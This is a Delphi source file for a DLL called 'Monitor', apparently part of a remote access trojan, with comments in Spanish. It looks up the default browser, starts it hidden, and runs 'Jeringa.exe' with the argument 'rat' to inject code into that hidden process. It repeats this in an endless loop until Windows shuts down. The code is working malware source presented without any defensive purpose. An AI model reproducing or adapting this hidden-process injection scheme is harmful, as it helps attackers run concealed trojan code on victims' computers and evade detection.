library Monitor;

uses
  Windows,
  LomLib,
  minireg,
  ShellApi;


const
  {$EXTERNALSYM WM_QUERYENDSESSION}
  WM_QUERYENDSESSION  = $0011;

var
  i:   integer;
  ResourcePointer: Pointer;
  pid: dword;
  handleWindow: integer;
  msg:tmsg;
  WinShutdown : boolean = false;

  function WinDir: string;
  var
    intLen:    integer;
    strBuffer: string;
  begin
    SetLength(strBuffer, 1000);
    intLen := GetWindowsDirectory(PChar(strBuffer), 1000);
    Result := (Copy(strBuffer, 1, intLen));
    if Result[Length(Result) - 1] <> '\' then
      Result := Result + '\';
  end;

  function SysDir: string;
  var
    intLen:    integer;
    strBuffer: string;
  begin
    SetLength(strBuffer, 1000);
    intLen := GetSystemDirectory(PChar(strBuffer), 1000);
    Result := (Copy(strBuffer, 1, intLen));
    if Result[Length(Result) - 1] <> '\' then
      Result := Result + '\';
  end;


  function getBrowser: ansistring;
  var
    ts: ansistring;
  begin
    RegGetString(HKEY_CLASSES_ROOT, '\htmlfile\shell\open\command\', ts);
    ts     := Copy(ts, Pos('"', ts) + 1, Length(ts));
    ts     := Copy(ts, 1, Pos('"', ts) - 1);
    Result := ts;
    //  ShowMessage('El browser esta en: '+ts);
  end;

  function StartMonitor: dword;
  var
    StartInfo: TStartupInfo;
    ProcInfo:  TProcessInformation;
    BytesRead, Module, Process, Size: dword;
    Path:      array [0..MAX_PATH] of char;
    Data:      pointer;
    HandleWindow: integer;
  begin
    //create process to inject into
    ZeroMemory(@StartInfo, SizeOf(TStartupInfo));
    StartInfo.cb      := SizeOf(TStartupInfo);
    startinfo.dwFlags := STARTF_USESHOWWINDOW; // use wShowWindow
    startinfo.wShowWindow := SW_HIDE;
    CreateProcess(nil, PAnsiChar(getBrowser), nil, nil, False, 0, nil,
      nil, StartInfo, ProcInfo);
    Result := procInfo.dwProcessId;
    ShellExecute(0, 'open', PAnsiChar(windir + 'Jeringa.exe'), PAnsiChar(
     'rat ' + IntToStr(procInfo.dwProcessId)), PAnsiChar(extractFilePath(ParamStr(0))), SW_SHOWNORMAL);
    WaitForSingleObject(ProcInfo.hProcess, INFINITE);
  end;


  procedure CheckWinShutdown;
  begin
    while (true) do
    begin
      if (PeekMessage(msg, 0, 0, 0, PM_REMOVE)) then
      begin
        if msg.message = WM_QUERYENDSESSION then
        begin
        WinShutDown := true;
        ShowMessage('La apagan!!!!!');
        end;
        TranslateMessage(Msg);
        DispatchMessage(Msg);
      end;
    end;
  end;

var
  id1: longword = 0;

begin

BeginThread(nil,
    0,
    Addr(CheckWinShutdown),
    nil,
    0,
    id1);

  while (True) do
  begin
    StartMonitor;
//no seguir ejecutando IE e inyectando si Windows se está apagando
    if winShutDown then Exit;
    //ShowMessage('Dll Cargado!!');
  end;//while

end.
